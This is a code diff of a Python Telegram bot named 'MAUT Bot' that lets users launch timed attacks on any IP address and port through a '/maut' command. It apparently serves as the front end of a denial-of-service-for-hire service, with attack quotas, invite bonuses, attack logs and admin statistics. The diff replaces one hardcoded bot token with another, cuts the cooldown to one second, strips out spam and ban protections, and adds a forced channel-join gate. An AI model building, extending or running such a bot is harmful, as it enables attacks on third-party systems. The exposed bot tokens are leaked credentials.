@@ -7,55 +7,49 @@ import time
 import re
 from threading import Lock
 import sqlite3
-import threading
 
 # Bot configuration
-bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
-admin_id = {"8167507955"}  # Add all admin IDs here
+bot = telebot.TeleBot('8012969135:AAEOvqxJfRqr_iU_KMtVjIyKH9GRt7bwBo4')
+admin_id = {"8167507955"}
 DB_FILE = "maut_bot.db"
 LOG_FILE = "attack_logs.txt"
-COOLDOWN_TIME = 600  # 5 minutes
+COOLDOWN_TIME = 1  # 5 minutes
 MAX_ATTACK_TIME = 240  # 4 minutes
 MAX_DAILY_ATTACKS = 10  # 10 attacks per day
 ATTACKS_PER_INVITE = 2  # 2 bonus attacks per invite
 IMAGE_URL = "https://t.me/gggkkkggggiii/9"
-SPAM_LIMIT = 5  # Max 5 messages per 10 seconds
-SPAM_WINDOW = 10  # 10 second window
-BAN_TIME = 3600  # 1 hour ban for spammers
+CHANNEL_ID = -1002440538814  # Channel ID to check membership
+CHANNEL_LINK = "https://t.me/+R4ram7JA-yY4MWQ1"  # Channel invite link
 
 # Initialize database
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
     
+    # Create users table
     cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id TEXT PRIMARY KEY, 
                       attacks_today INTEGER DEFAULT 0, 
                       last_attack_date TEXT,
                       total_attacks INTEGER DEFAULT 0,
-                      invites INTEGER DEFAULT 0,
-                      is_banned INTEGER DEFAULT 0,
-                      ban_reason TEXT DEFAULT '',
-                      ban_end TEXT DEFAULT '')''')
+                      invites INTEGER DEFAULT 0)''')
     
+    # Create cooldown table
     cursor.execute('''CREATE TABLE IF NOT EXISTS cooldown 
                      (user_id TEXT PRIMARY KEY, 
                       cooldown_end TEXT)''')
     
+    # Create active_attacks table
     cursor.execute('''CREATE TABLE IF NOT EXISTS active_attacks 
                      (user_id TEXT PRIMARY KEY,
                       start_time TEXT,
                       duration INTEGER)''')
     
+    # Create referrals table
     cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
                      (referrer_id TEXT,
                       referred_id TEXT,
                       PRIMARY KEY (referrer_id, referred_id))''')
-    
-    cursor.execute('''CREATE TABLE IF NOT EXISTS spam_protection
-                     (user_id TEXT PRIMARY KEY,
-                      message_count INTEGER DEFAULT 0,
-                      last_message_time REAL DEFAULT 0)''')
     
     conn.commit()
     conn.close()
@@ -64,18 +58,13 @@ def init_db():
 def db_execute(query, params=(), fetch=False):
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
-    try:
-        cursor.execute(query, params)
-        if fetch:
-            result = cursor.fetchall()
-        else:
-            result = None
-        conn.commit()
-    except Exception as e:
-        print(f"Database error: {e}")
+    cursor.execute(query, params)
+    if fetch:
+        result = cursor.fetchall()
+    else:
         result = None
-    finally:
-        conn.close()
+    conn.commit()
+    conn.close()
     return result
 
 def get_user(user_id):
@@ -95,76 +84,25 @@ def log_attack(user_id, target, port, time):
     except Exception as e:
         print(f"Logging error: {e}")
 
-# Spam protection system
-user_message_count = {}
-spam_lock = Lock()
-banned_users = {}
-
-def check_spam(user_id):
-    now = time.time()
-    with spam_lock:
-        # Check if user is banned
-        if is_banned(user_id):
-            return True
-        
-        # Get or initialize user spam data
-        result = db_execute("SELECT message_count, last_message_time FROM spam_protection WHERE user_id=?", 
-                          (user_id,), fetch=True)
-        
-        if result:
-            count, last_time = result[0]
-            if now - last_time > SPAM_WINDOW:
-                count = 0
-        else:
-            count = 0
-        
-        # Update count
-        count += 1
-        db_execute("INSERT OR REPLACE INTO spam_protection (user_id, message_count, last_message_time) VALUES (?, ?, ?)",
-                  (user_id, count, now))
-        
-        if count > SPAM_LIMIT:
-            # Ban the user temporarily
-            ban_user(user_id, BAN_TIME//3600, "Spam detected")
-            return True
-    return False
-
-def ban_user(user_id, duration_hours=24, reason=""):
-    ban_end = time.time() + (duration_hours * 3600)
-    with spam_lock:
-        banned_users[user_id] = ban_end
-    db_execute("UPDATE users SET is_banned=1, ban_reason=?, ban_end=? WHERE user_id=?",
-              (reason, datetime.datetime.fromtimestamp(ban_end).isoformat(), user_id))
-
-def unban_user(user_id):
-    with spam_lock:
-        if user_id in banned_users:
-            del banned_users[user_id]
-    db_execute("UPDATE users SET is_banned=0, ban_reason='', ban_end='' WHERE user_id=?", (user_id,))
-
-def is_banned(user_id):
-    # Check memory first
-    now = time.time()
-    with spam_lock:
-        if user_id in banned_users:
-            if banned_users[user_id] > now:
-                return True
-            else:
-                del banned_users[user_id]
+def parse_time_input(time_str):
+    time_str = time_str.lower()
+    total_seconds = 0
     
-    # Check database
-    result = db_execute("SELECT ban_end FROM users WHERE user_id=? AND is_banned=1", (user_id,), fetch=True)
-    if result:
-        ban_end = datetime.datetime.fromisoformat(result[0][0]).timestamp()
-        if ban_end > now:
-            with spam_lock:
-                banned_users[user_id] = ban_end
-            return True
-        else:
-            unban_user(user_id)
-    return False
+    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
+    
+    for amount, unit in matches:
+        amount = int(amount)
+        if unit in ['day', 'd']:
+            total_seconds += amount * 86400
+        elif unit in ['hour', 'h']:
+            total_seconds += amount * 3600
+        elif unit in ['min', 'm']:
+            total_seconds += amount * 60
+        elif unit in ['sec', 's']:
+            total_seconds += amount
+    
+    return total_seconds if total_seconds > 0 else None
 
-# Attack functions
 def is_attack_active():
     result = db_execute("SELECT COUNT(*) FROM active_attacks", fetch=True)
     return result[0][0] > 0 if result else False
@@ -232,7 +170,6 @@ def get_cooldown_remaining(user_id):
     remaining = (cooldown_end - datetime.datetime.now()).seconds
     return max(0, remaining)
 
-# Referral system
 def add_referral(referrer_id, referred_id):
     try:
         # Check if this is a valid new referral
@@ -280,29 +217,38 @@ def get_user_stats(user_id):
         'attacks_remaining': attacks_remaining,
         'total_attacks': user[3],
         'invites': invites,
-        'bonus_attacks': invites * ATTACKS_PER_INVITE,
-        'is_banned': user[5],
-        'ban_reason': user[6],
-        'ban_end': user[7]
+        'bonus_attacks': invites * ATTACKS_PER_INVITE
     }
 
-# Spam protection decorator
-def spam_protected(func):
-    def wrapper(message):
-        user_id = str(message.chat.id)
-        if is_banned(user_id):
-            return bot.reply_to(message, "❌ You are temporarily banned from using this bot.")
-        if check_spam(user_id):
-            return bot.reply_to(message, "⚠️ You're sending too many requests. Please wait.")
-        return func(message)
-    return wrapper
+def check_channel_membership(user_id):
+    try:
+        member = bot.get_chat_member(CHANNEL_ID, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except Exception as e:
+        print(f"Error checking channel membership: {e}")
+        return False
 
-# Command handlers
+def send_channel_join_message(chat_id):
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("Join Channel", url=CHANNEL_LINK))
+    markup.add(types.InlineKeyboardButton("✅ I've Joined", callback_data="check_join"))
+    
+    bot.send_message(
+        chat_id,
+        "⚠️ You must join our channel to use this bot:\n\n"
+        f"{CHANNEL_LINK}\n\n"
+        "After joining, click the button below to verify.",
+        reply_markup=markup
+    )
+
 @bot.message_handler(commands=['start'])
-@spam_protected
 def start_command(message):
     user_id = str(message.chat.id)
-    create_user(user_id)
+    create_user(user_id)  # Ensure user exists
+    
+    # Check channel membership first
+    if not check_channel_membership(user_id):
+        return send_channel_join_message(message.chat.id)
     
     # Check for referral
     referral_success = False
@@ -345,15 +291,30 @@ def start_command(message):
         bot.reply_to(message, caption, parse_mode="Markdown")
         print(f"Error sending image: {e}")
 
+@bot.callback_query_handler(func=lambda call: call.data == "check_join")
+def check_join_callback(call):
+    user_id = str(call.from_user.id)
+    
+    if check_channel_membership(user_id):
+        bot.answer_callback_query(call.id, "✅ Verification successful!")
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        start_command(call.message)  # Show start message
+    else:
+        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet!", show_alert=True)
+
+def check_membership_wrapper(func):
+    def wrapped(message):
+        user_id = str(message.chat.id)
+        if not check_channel_membership(user_id):
+            return send_channel_join_message(message.chat.id)
+        return func(message)
+    return wrapped
+
 @bot.message_handler(commands=['maut'])
-@spam_protected
+@check_membership_wrapper
 def handle_attack_command(message):
     user_id = str(message.chat.id)
-    create_user(user_id)
-    
-    # Check if banned
-    if is_banned(user_id):
-        return bot.reply_to(message, "❌ You are banned from using this bot.")
+    create_user(user_id)  # Ensure user exists
     
     # Check if another attack is active
     active_info = get_active_attack_info()
@@ -398,12 +359,16 @@ def handle_attack_command(message):
         if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
             return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
         
+        # Store attack data
+        user_attack_data = {
+            'ip': ip,
+            'port': port,
+            'time': attack_time
+        }
+        
         # Show confirmation
         markup = types.InlineKeyboardMarkup()
-        markup.add(
-            types.InlineKeyboardButton("✅ Start Attack", callback_data=f"start_attack|{ip}|{port}|{attack_time}"),
-            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
-        )
+        markup.add(types.InlineKeyboardButton("✅ Start Attack", callback_data=f"start_attack|{ip}|{port}|{attack_time}"))
         
         bot.send_message(
             message.chat.id,
@@ -412,7 +377,7 @@ def handle_attack_command(message):
             f"🔌 Port: `{port}`\n"
             f"⏱ Time: `{attack_time}`s\n"
             f"📊 Attacks left today: {stats['attacks_remaining']-1}\n\n"
-            f"Confirm attack:",
+            f"Click below to confirm attack:",
             parse_mode="Markdown",
             reply_markup=markup
         )
@@ -422,7 +387,7 @@ def handle_attack_command(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_buttons(call):
-    user_id = str(call.message.chat.id)
+    user_id = str(call.from_user.id)
     
     if call.data.startswith("start_attack"):
         _, ip, port, attack_time = call.data.split("|")
@@ -480,13 +445,6 @@ def handle_buttons(call):
                 text=f"❌ Error: {str(e)}"
             )
     
-    elif call.data == "cancel_attack":
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text="❌ Attack cancelled"
-        )
-    
     elif call.data == "new_attack":
         if is_on_cooldown(user_id):
             remaining = get_cooldown_remaining(user_id)
@@ -494,78 +452,10 @@ def handle_buttons(call):
         
         bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
     
-    elif call.data.startswith("admin_"):
-        if user_id not in admin_id:
-            return bot.answer_callback_query(call.id, "❌ Admin only")
-        
-        action = call.data.split('_')[1]
-        
-        if action == "stats":
-            total_users = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
-            today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
-                                      (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
-            total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
-            banned_count = db_execute("SELECT COUNT(*) FROM users WHERE is_banned=1", fetch=True)[0][0]
-            
-            stats = f"""
-📊 *Admin Stats* 📊
-
-• Total users: {total_users}
-• Banned users: {banned_count}
-• Attacks today: {today_attacks}
-• Total attacks: {total_attacks}
-"""
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=stats,
-                parse_mode="Markdown"
-            )
-        
-        elif action == "ban":
-            msg = bot.send_message(call.message.chat.id, "Send user ID to ban and duration in hours (e.g., '12345 24'):")
-            bot.register_next_step_handler(msg, process_ban)
-        
-        elif action == "unban":
-            msg = bot.send_message(call.message.chat.id, "Send user ID to unban:")
-            bot.register_next_step_handler(msg, process_unban)
-        
-        elif action == "stop":
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text="🛑 Bot is shutting down..."
-            )
-            os._exit(0)
-    
     bot.answer_callback_query(call.id)
 
-def process_ban(message):
-    if str(message.chat.id) not in admin_id:
-        return
-    
-    try:
-        parts = message.text.split()
-        user_to_ban = parts[0]
-        duration = int(parts[1]) if len(parts) > 1 else 24
-        ban_user(user_to_ban, duration, "Admin ban")
-        bot.reply_to(message, f"✅ User {user_to_ban} has been banned for {duration} hours.")
-    except:
-        bot.reply_to(message, "❌ Invalid format. Use: 'user_id hours'")
-
-def process_unban(message):
-    if str(message.chat.id) not in admin_id:
-        return
-    
-    try:
-        user_to_unban = message.text.strip()
-        unban_user(user_to_unban)
-        bot.reply_to(message, f"✅ User {user_to_unban} has been unbanned.")
-    except:
-        bot.reply_to(message, "❌ Invalid user ID")
-
 @bot.message_handler(commands=['mystats'])
-@spam_protected
+@check_membership_wrapper
 def show_stats(message):
     user_id = str(message.chat.id)
     create_user(user_id)
@@ -582,17 +472,13 @@ def show_stats(message):
 • Total attacks: {stats['total_attacks']}
 • Friends invited: {stats['invites']}
 • Bonus attacks earned: {stats['bonus_attacks']}
+
+Use /invite to get more attacks!
 """
-    if stats['is_banned']:
-        ban_end = datetime.datetime.fromisoformat(stats['ban_end'])
-        response += f"\n⚠️ *Account Status:* BANNED\n"
-        response += f"• Reason: {stats['ban_reason']}\n"
-        response += f"• Until: {ban_end.strftime('%Y-%m-%d %H:%M:%S')}"
-    
     bot.reply_to(message, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=['invite'])
-@spam_protected
+@check_membership_wrapper
 def invite_command(message):
     user_id = str(message.chat.id)
     create_user(user_id)
@@ -617,7 +503,7 @@ def invite_command(message):
     bot.reply_to(message, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=['mylogs'])
-@spam_protected
+@check_membership_wrapper
 def my_logs(message):
     user_id = str(message.chat.id)
     
@@ -636,7 +522,7 @@ def my_logs(message):
     bot.reply_to(message, f"📜 Your Attack History (last 10):\n\n" + "".join(user_logs[-10:]))
 
 @bot.message_handler(commands=['help'])
-@spam_protected
+@check_membership_wrapper
 def help_command(message):
     help_text = """
 🛠 *MAUT Bot Help* 🛠
@@ -654,7 +540,7 @@ def help_command(message):
     bot.reply_to(message, help_text, parse_mode="Markdown")
 
 @bot.message_handler(commands=['rules'])
-@spam_protected
+@check_membership_wrapper
 def rules_command(message):
     rules = """
 📜 *Usage Rules* 📜
@@ -669,48 +555,38 @@ Violations will result in ban.
 """
     bot.reply_to(message, rules, parse_mode="Markdown")
 
+# Admin commands (hidden from public)
 @bot.message_handler(commands=['admin'])
-@spam_protected
-def admin_panel(message):
+def admin_stats(message):
     user_id = str(message.chat.id)
     if user_id not in admin_id:
         return
     
-    markup = types.InlineKeyboardMarkup()
-    markup.add(
-        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
-        types.InlineKeyboardButton("🔒 Ban User", callback_data="admin_ban"),
-        types.InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"),
-        types.InlineKeyboardButton("🛑 Stop Bot", callback_data="admin_stop")
-    )
+    total_users = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
+    today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
+                              (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
+    total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
+    total_referrals = db_execute("SELECT COUNT(*) FROM referrals", fetch=True)[0][0]
     
-    bot.reply_to(message, "👑 *Admin Panel* 👑", reply_markup=markup, parse_mode="Markdown")
+    response = f"""
+👑 *Admin Stats* 👑
 
-# Bot runner with error handling
-def run_bot():
-    while True:
-        try:
-            print("⚡ MAUT Bot Started ⚡")
-            bot.polling(none_stop=True, interval=1, timeout=20)
-        except Exception as e:
-            print(f"Bot crashed: {e}")
-            time.sleep(5)
+• Total users: {total_users}
+• Attacks today: {today_attacks}
+• Total attacks: {total_attacks}
+• Total referrals: {total_referrals}
+• Active attacks: {"Yes" if is_attack_active() else "No"}
+"""
+    bot.reply_to(message, response, parse_mode="Markdown")
 
-if __name__ == '__main__':
-    # Initialize database
-    init_db()
-    
-    # Clean up any active attacks on startup
-    db_execute("DELETE FROM active_attacks")
-    
-    # Run in a separate thread to prevent blocking
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
-    
+# Initialize database
+init_db()
+
+# Start bot
+print("⚡ MAUT Bot Started ⚡")
+while True:
     try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Shutting down...")
-        os._exit(0)
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(f"Error: {e}")
+        time.sleep(5)
